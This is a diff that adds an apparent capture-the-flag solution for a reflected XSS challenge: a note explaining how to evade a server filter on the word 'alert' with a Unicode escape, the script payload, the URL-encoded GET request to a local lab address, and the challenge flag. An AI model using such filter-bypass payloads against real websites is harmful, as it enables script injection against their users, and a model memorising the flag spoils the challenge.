@@ -1,0 +1,4 @@
+# Reflected XSS on /page?name= parameter. Server blocks literal 'alert' string. Bypass: use \u0061lert (Unicode escape for 'a') so 'alert' never appears literally. Payload: <script>window['\u0061lert']('XSS')</script>. Returns flag{cc21e4bb-7e26-4326-ba5a-052b6b1092e1} on success.
+
+GET /page?name=%3Cscript%3Ewindow%5B%27%5Cu0061lert%27%5D%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
+Host: 172.17.0.1:48945
